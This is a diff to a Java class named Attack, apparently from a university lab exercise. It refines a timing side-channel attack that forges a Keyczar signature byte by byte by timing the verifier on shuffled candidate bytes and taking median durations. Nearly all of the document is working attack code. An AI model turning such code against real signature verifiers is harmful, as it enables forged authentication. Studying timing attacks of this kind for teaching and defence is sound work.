@@ -5,6 +5,8 @@ import cz.cvut.keyczar.exceptions.KeyczarException;
 
 import java.nio.ByteBuffer;
 import java.util.Arrays;
+import java.util.Collections;
+import java.util.LinkedList;
 import java.util.Random;
 
 /**
@@ -30,6 +32,7 @@ public class Attack {
     private static long[] avgByteDurations;
     private static byte[] signature;
     private static int[] findByteTries;
+    private static Byte[] possibleInputs;
 
     public static void main(String[] args) throws KeyczarException {
 
@@ -44,6 +47,12 @@ public class Attack {
         signature = new byte[SIGNATURE_LENGTH];
         findByteTries = new int[SIGNATURE_LENGTH];
         Arrays.fill(signature, Byte.MIN_VALUE);
+
+        // generate possible
+        possibleInputs = new Byte[256];
+        for (int i = 0; i < 256; i++) {
+            possibleInputs[i] = byteIndexToValue(i);
+        }
 
         for (int i = 0; i < SIGNATURE_LENGTH; i++) {
             findByte(i);
@@ -130,23 +139,31 @@ public class Attack {
         avgByteDurations[byteIndex] = 0;
         findByteTries[byteIndex]++;
 
-        for (int i = 0; i < 256; i++) {
-            signature[byteIndex] = (byte) (i - Math.abs((int) Byte.MIN_VALUE));
-            long[] durations = new long[NUMBER_OF_TRIES];
-            long iterationStart;
-            warmUp(NUMBER_OF_TRIES / 10);
+        warmUp(NUMBER_OF_TRIES);
 
-            for (int n = 0; n < NUMBER_OF_TRIES; n++) {
+        long[][] durations = new long[possibleInputs.length][NUMBER_OF_TRIES];
+        for (int n = 0; n < NUMBER_OF_TRIES; n++) {
+            LinkedList<Byte> candidates = new LinkedList<>();
+            candidates.addAll(Arrays.asList(possibleInputs));
+            Collections.shuffle(candidates); // shuffle is done to minimize JVM optimizations (and/or other performance tuning during iteration)
+
+            Byte candidate;
+            while ((candidate = candidates.pollFirst()) != null) {
+                signature[byteIndex] = candidate;
                 signatureBuffer = ByteBuffer.wrap(addPrefix(signature));
                 messageBuffer.position(0);
                 signatureBuffer.position(0);
 
-                iterationStart = System.nanoTime();
+                long iterationStart = System.nanoTime();
                 verifier.verify(messageBuffer, signatureBuffer);
-                durations[n] = (System.nanoTime() - iterationStart);
-            }
+                long iterationEnd = System.nanoTime();
 
-            long actualDuration = getMedian(durations);
+                durations[byteValueToIndex(candidate)][n] = (iterationEnd - iterationStart);
+            }
+        }
+
+        for (int i = 0; i < possibleInputs.length; i++) {
+            long actualDuration = getMedian(durations[i]);
 
             avgByteDurations[byteIndex] += actualDuration;
 
@@ -178,5 +195,25 @@ public class Attack {
         System.arraycopy(GOOD_PREAMBLE, 0, signatureWithPrefix, 0, PREAMBLE_LENGTH);
         System.arraycopy(signature, 0, signatureWithPrefix, PREAMBLE_LENGTH, SIGNATURE_LENGTH);
         return signatureWithPrefix;
+    }
+
+    /**
+     * Java byte values are -127 to 126, but we want to stare them in simple array.
+     * This metod transfers array index to value.
+     * @param byteIndex array index
+     * @return byte value
+     */
+    private static byte byteIndexToValue(int byteIndex) {
+        return (byte) (byteIndex - ((int) Byte.MIN_VALUE * -1));
+    }
+
+    /**
+     * Java byte values are -127 to 126, but we want to stare them in simple array.
+     * This metod transfers value to array index.
+     * @param byteValue byteValue
+     * @return array index
+     */
+    private static int byteValueToIndex(int byteValue) {
+        return byteValue + ((int) Byte.MIN_VALUE * -1);
     }
 }
